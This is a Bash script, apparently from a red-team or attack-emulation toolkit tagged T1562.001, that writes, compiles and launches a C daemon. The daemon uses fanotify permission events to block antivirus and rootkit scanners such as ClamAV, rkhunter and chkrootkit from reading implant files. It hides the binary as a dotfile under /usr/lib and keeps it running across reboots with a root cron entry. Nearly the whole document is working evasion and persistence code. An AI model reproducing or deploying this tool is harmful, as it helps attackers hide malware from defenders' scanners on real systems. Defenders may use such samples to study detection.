#!/bin/bash
# T1562.001 — Impair Defenses: fanotify File Access Hooking
# Block security scanners from reading malicious files at VFS layer

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_fanotify"
WORKDIR="/tmp/.${MARKER}"

banner() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1562.001 — fanotify File Access Hooking    ║"
    echo "  ║   Block scanners at VFS layer (deny reads)    ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

deploy_fanotify() {
    echo -e "${CYAN}[*] Deploying fanotify access control${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required (CAP_SYS_ADMIN)${NC}"; return; }

    if ! command -v gcc &>/dev/null; then
        echo -e "${RED}[!] gcc required${NC}"; return
    fi

    echo -e "${YELLOW}[*] fanotify (FAN_OPEN_PERM) intercepts file access decisions at the VFS layer."
    echo -e "    Can DENY reads to specific files — scanners/EDR cannot read our implants."
    echo -e "    More powerful than inotify — can block, not just watch."
    echo -e "    Legitimate use: antivirus (ClamAV on-access scanning).${NC}"
    echo ""

    read -p "  Files/patterns to protect (comma-separated): " PROTECT
    [[ -z "$PROTECT" ]] && PROTECT=".d3m0n,libsystem_helper,libport_helper,libnfq_helper"
    read -p "  Scanners to block (comma-separated process names): " SCANNERS
    [[ -z "$SCANNERS" ]] && SCANNERS="clamscan,freshclam,rkhunter,chkrootkit,lynis,aide"

    mkdir -p "$WORKDIR"

    # Convert to C array
    local PROTECT_ARRAY=""
    IFS=',' read -ra PARR <<< "$PROTECT"
    for p in "${PARR[@]}"; do
        PROTECT_ARRAY+="\"$(echo "$p" | xargs)\","
    done

    local SCANNER_ARRAY=""
    IFS=',' read -ra SARR <<< "$SCANNERS"
    for s in "${SARR[@]}"; do
        SCANNER_ARRAY+="\"$(echo "$s" | xargs)\","
    done

    cat > "${WORKDIR}/fanotify_guard.c" << CEOF
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/fanotify.h>
#include <linux/limits.h>
#include <errno.h>

/* Files to hide from scanners */
static const char *protected_names[] = {${PROTECT_ARRAY} NULL};
/* Scanner process names to block */
static const char *scanner_names[] = {${SCANNER_ARRAY} NULL};

static int is_scanner(pid_t pid) {
    char path[64], comm[256];
    snprintf(path, sizeof(path), "/proc/%d/comm", pid);
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    if (fgets(comm, sizeof(comm), f)) {
        comm[strcspn(comm, "\n")] = 0;
        for (int i = 0; scanner_names[i]; i++) {
            if (strstr(comm, scanner_names[i])) {
                fclose(f);
                return 1;
            }
        }
    }
    fclose(f);
    return 0;
}

static int is_protected(const char *path) {
    for (int i = 0; protected_names[i]; i++) {
        if (strstr(path, protected_names[i]))
            return 1;
    }
    return 0;
}

static char *get_path_from_fd(int fd, char *buf, size_t len) {
    char proc_path[64];
    snprintf(proc_path, sizeof(proc_path), "/proc/self/fd/%d", fd);
    ssize_t n = readlink(proc_path, buf, len - 1);
    if (n < 0) return NULL;
    buf[n] = 0;
    return buf;
}

int main() {
    daemon(0, 0);
    signal(SIGCHLD, SIG_IGN);

    int fan_fd = fanotify_init(FAN_CLOEXEC | FAN_CLASS_CONTENT | FAN_NONBLOCK,
                               O_RDONLY | O_LARGEFILE);
    if (fan_fd < 0) {
        /* Fallback to notification-only mode */
        fan_fd = fanotify_init(FAN_CLOEXEC | FAN_CLASS_NOTIF, O_RDONLY);
        if (fan_fd < 0) return 1;
    }

    /* Watch entire filesystem for open permissions */
    if (fanotify_mark(fan_fd, FAN_MARK_ADD | FAN_MARK_MOUNT,
                      FAN_OPEN_PERM, AT_FDCWD, "/") < 0) {
        /* Try without PERM if not supported */
        fanotify_mark(fan_fd, FAN_MARK_ADD | FAN_MARK_MOUNT,
                      FAN_OPEN, AT_FDCWD, "/");
    }

    char buf[4096];
    while (1) {
        int len = read(fan_fd, buf, sizeof(buf));
        if (len <= 0) { usleep(100000); continue; }

        struct fanotify_event_metadata *event = (struct fanotify_event_metadata *)buf;
        while (FAN_EVENT_OK(event, len)) {
            if (event->fd >= 0) {
                char filepath[PATH_MAX];
                if (get_path_from_fd(event->fd, filepath, sizeof(filepath))) {
                    int response = FAN_ALLOW;

                    /* If a scanner is opening a protected file, deny it */
                    if (is_protected(filepath) && is_scanner(event->pid)) {
                        response = FAN_DENY;
                    }

                    if (event->mask & FAN_OPEN_PERM) {
                        struct fanotify_response resp = {
                            .fd = event->fd,
                            .response = response
                        };
                        write(fan_fd, &resp, sizeof(resp));
                    }
                }
                close(event->fd);
            }
            event = FAN_EVENT_NEXT(event, len);
        }
    }
    return 0;
}
CEOF

    echo -e "${CYAN}[*] Compiling fanotify guard...${NC}"
    gcc -o "${WORKDIR}/fanotify_guard" "${WORKDIR}/fanotify_guard.c" 2>/dev/null

    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Compilation failed${NC}"; return
    fi

    cp "${WORKDIR}/fanotify_guard" /usr/lib/.libfanotify_helper
    chmod 755 /usr/lib/.libfanotify_helper
    /usr/lib/.libfanotify_helper &

    # Persistence
    cat > "/etc/cron.d/${MARKER}" << EOF
@reboot root /usr/lib/.libfanotify_helper &
EOF
    chmod 600 "/etc/cron.d/${MARKER}"

    echo -e "${GREEN}[+] fanotify guard active${NC}"
    echo -e "${GREEN}[+] Protected files: ${PROTECT}${NC}"
    echo -e "${GREEN}[+] Blocked scanners: ${SCANNERS}${NC}"
    echo -e "${YELLOW}[*] Scanners will get 'Permission denied' when reading protected files${NC}"
    echo -e "${YELLOW}[*] Normal users/processes can still access files normally${NC}"
}

cleanup() {
    echo -e "${CYAN}[*] Cleaning up fanotify guard...${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    pkill -f "libfanotify_helper" 2>/dev/null
    rm -f /usr/lib/.libfanotify_helper
    rm -f "/etc/cron.d/${MARKER}"
    rm -rf "$WORKDIR"

    echo -e "${GREEN}[+] fanotify guard removed${NC}"
}

main() {
    banner

    echo -e "  ${CYAN}[1]${NC} Deploy fanotify file protection"
    echo -e "  ${CYAN}[2]${NC} Cleanup"
    echo ""
    read -p "Choose [1-2]: " OPT

    case "$OPT" in
        1) deploy_fanotify ;;
        2) cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
